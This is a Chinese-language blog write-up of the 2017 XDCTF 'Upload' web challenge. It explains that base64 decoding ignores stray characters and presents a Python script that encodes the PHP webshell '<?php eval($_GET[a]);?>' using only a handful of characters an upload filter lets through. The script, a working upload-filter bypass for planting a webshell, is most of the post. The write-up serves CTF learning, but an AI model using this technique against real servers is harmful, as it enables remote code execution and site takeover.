---
title: 2017 XDCTF  Upload
tags: [write-up]
date: 2017-10-06 00:46
---
比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><p>比赛早就结束了，有个web题目一直没想到怎么写直到官方发题解才知道，原来还有这一个套路（其实是一个知识点的），好久没有写博客了要长草了，写个博客记录一下</p>
<h1 id="0x01-base64-little-trick">0x01 base64 little trick</h1>
<p>在base64解码的时候其他多余字符是自动被忽略的 <br>
例如下图</br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006002338596?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="0x02-文件上传分析">0x02 文件上传分析</h1>
<p>上传的文件我们可以看出过滤了大部分字符，只有actgACTG没有被过滤 <br>
猜想是利用这几个字符构造webshell，但是当时不知道小trick所以没有想到写脚本。</br></p>
<h1 id="0x03-脚本编写">0x03 脚本编写</h1>
<p>根据base64的小trick，写一个通用的脚本达到任意几个字符就可以构造webshell的目的</p>
<p>下面来分析一下脚本的编写</p>
<p>实现的过程是这样的，因为base64是四字节对齐所以我们用4字节进行全排列，然后解码找出只有一个合法字符的原字符串（生成字典），直到遍历完全排列的字符串，去掉值重复的值，本轮结束，查看有没有包含shellcode所需要的所有字符如果有直接输出。没有继续重复上述操作，并在接下来的每一步的最后来一个字符串映射。</p>
<p>具体脚本如下：</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">import</span> itertools
<span class="hljs-keyword">import</span> string
<span class="hljs-keyword">import</span> sets
<span class="hljs-keyword">import</span> base64


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutation</span><span class="hljs-params">(strs)</span>:</span>
    strings = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.permutations(strs,<span class="hljs-number">4</span>):
        s = <span class="hljs-string">''</span>.join(i)
        strings.append(s)
    <span class="hljs-keyword">return</span> strings

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_dic</span><span class="hljs-params">(strs)</span>:</span><span class="hljs-comment">#1 利用字符串创造字典</span>
    dic =  {i:base64.b64decode(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permutation(strs)}
    <span class="hljs-keyword">return</span> dic


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">clac_shouldbe</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#2 筛选字典中value的值留下只有一个合法字符的键值对</span>
    <span class="hljs-comment"># print dic</span>
    new = {}
    should_be = string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="hljs-string">'='</span>+<span class="hljs-string">'/'</span>+<span class="hljs-string">'+'</span>
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic:
        set1 = sets.Set(should_be)
        set2 = sets.Set(dic[key])
        Intersect = <span class="hljs-string">''</span>.join(set1 &amp; set2)
        <span class="hljs-keyword">if</span> len(Intersect) == <span class="hljs-number">1</span>:
            new[key]=Intersect
    <span class="hljs-keyword">return</span> new

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">remove_Dup</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#3 去value重复的键值对</span>
    mid = {dic[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic}
    dic = {mid[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> mid}
    <span class="hljs-keyword">return</span> dic

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new_strs</span><span class="hljs-params">(dic)</span>:</span><span class="hljs-comment">#去重之后生成新的字符串</span>
    s = <span class="hljs-string">''</span>
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic:
        s += dic[key]
    <span class="hljs-keyword">return</span> s.replace(<span class="hljs-string">'='</span>,<span class="hljs-string">''</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strs_replaces</span><span class="hljs-params">(dic1,dic2)</span>:</span><span class="hljs-comment">#4 字符串映射 </span>
    revs = {dic1[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic1}
    <span class="hljs-keyword">return</span> {revs[key[<span class="hljs-number">0</span>]]+revs[key[<span class="hljs-number">1</span>]]+revs[key[<span class="hljs-number">2</span>]]+revs[key[<span class="hljs-number">3</span>]]:dic2[key] <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic2}

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test_already</span><span class="hljs-params">(str1,str2)</span>:</span><span class="hljs-comment">#判断时候全部包含shellcode所需要的值</span>

    set1 = sets.Set(str1)   
    set2 = sets.Set(str2)
    Intersect = <span class="hljs-string">''</span>.join(set1 &amp; set2)

    <span class="hljs-comment"># print Intersect</span>

    <span class="hljs-keyword">if</span>(len(Intersect) == len(set1)):
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>



shell = <span class="hljs-string">"&lt;?php eval($_GET[a]);?&gt;"</span>
shell = base64.b64encode(shell)
shell_base = <span class="hljs-string">'PD9waHAgZXZhbCgkX0dFVFthXSk7Pz4='</span>

strs = <span class="hljs-string">'1234'</span>
<span class="hljs-comment">#strings what you want to make up shellcode with</span>



dic = remove_Dup(clac_shouldbe(create_dic(strs)))
strs = new_strs(dic)
<span class="hljs-comment"># print dic</span>
<span class="hljs-comment">#create nonredundant value of dict ,once to decode</span>



<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">6</span>):
    <span class="hljs-keyword">print</span> <span class="hljs-string">"Has based "</span>+str(i) +<span class="hljs-string">' times '</span>
    dic1 = remove_Dup(clac_shouldbe(create_dic(strs)))
    strs = new_strs(dic1)
    dic = strs_replaces(dic,dic1)
    <span class="hljs-comment"># print dic</span>
    <span class="hljs-keyword">if</span> test_already(shell_base,strs+<span class="hljs-string">'='</span>):
        <span class="hljs-keyword">break</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"Has based "</span>+str(i+<span class="hljs-number">1</span>) +<span class="hljs-string">' times ,you have decode '</span>+str(i+<span class="hljs-number">1</span>+<span class="hljs-number">1</span>)+<span class="hljs-string">' times '</span>


revs = {dic[key]:key <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dic}
<span class="hljs-keyword">print</span> <span class="hljs-string">'++++++++++++++++++++++++\n'</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join(revs[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> shell_base)
</code></pre>
<h1 id="0x04-测试">0x04 测试</h1>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006004324727?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20171006004452502?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h1 id="0x05-总结">0x05 总结</h1>
<p>确实是一个巧妙的方法，有学习了一个姿势</p></div>